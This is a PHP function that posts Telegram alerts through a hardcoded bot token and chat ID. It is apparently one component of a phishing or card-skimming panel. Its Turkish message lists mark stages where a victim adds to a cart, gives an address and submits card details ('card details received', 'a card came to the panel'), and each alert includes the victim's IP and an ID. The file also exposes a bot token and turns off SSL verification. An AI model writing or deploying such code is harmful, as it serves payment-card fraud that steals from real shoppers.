<?php
function telegram_send_message($message_type, $ip = null, $user_id = null) {
    $bot_token = "8354925156:AAEn9iqt0sgi21K8LGH5OztPpZbWWKMj5pY";
    $chat_id = "-4824977814";
    
    // Random emoji seçimi
    $emojis = ["🎉", "🔥", "💥", "⚡", "🚀", "✨", "🎊", "💎", "🌟", "🎯", "💰", "💸", "🎲", "🎪", "🎭"];
    $random_emoji = $emojis[array_rand($emojis)];
    
    // Random token oluşturma
    $random_token = substr(md5(uniqid(rand(), true)), 0, 8);
    
    // Mesaj tiplerine göre random mesajlar
    $messages = [
        "sepet" => [
            "1 YENİ SEPET",
            "bunda para olabilir daşşaklı birine benziyor",
            "bu fakirde olabilir şansına küs",
            "parayı şimdi bulduk gardaş",
            "sanırım kervan başlıyooooooo",
            "esc fiyatlarınada zam geldiydi iyi oldu bu",
            "yolumuzu bulacaz mı abi",
            "zeki mürende bizi görcek mi ?",
            "yeni müşteri geldi gardaş",
            "bu sefer tuttu mu acaba",
            "hadi bakalım ne çıkacak",
            "bu sefer şanslıyız galiba"
        ],
        "adres" => [
            "Müşteri Geldi Hanımmmm !",
            "adres verdi gardaş geldi",
            "bu sefer ciddi görünüyor",
            "adres bilgileri alındı",
            "müşteri hazır görünüyor",
            "bu sefer tutacak gibi",
            "adres tamamlandı gardaş",
            "müşteri hazır bekliyor",
            "bu sefer şanslıyız",
            "adres bilgileri tamam"
        ],
        "odeme" => [
            "Panele bagggh gardaş kart geldi",
            "kart bilgileri alındı gardaş",
            "bu sefer tuttu mu acaba",
            "kart geldi hadi bakalım",
            "bu sefer şanslıyız galiba",
            "kart bilgileri tamamlandı",
            "bu kart  ciddi görünüyor",
            "kart geldi gardaş",
            "bu kartla sefer tutacak gibi",
            "kart bilgileri alındı"
        ]
    ];
    
    // Mesaj tipine göre random mesaj seç
    $selected_message = $messages[$message_type][array_rand($messages[$message_type])];
    
    // IP ve ID bilgilerini ekle
    $extra_info = "";
    if ($ip) {
        $extra_info .= "\n📍 IP: <code>" . $ip . "</code>";
    }
    if ($user_id) {
        $extra_info .= "\n🆔 ID: <code>" . $user_id . "</code>";
    }
    $extra_info .= "\n🔑 Token: <code>" . $random_token . "</code>";
    
    $full_message = $random_emoji . " " . $selected_message . $extra_info;
    
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $full_message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}
?>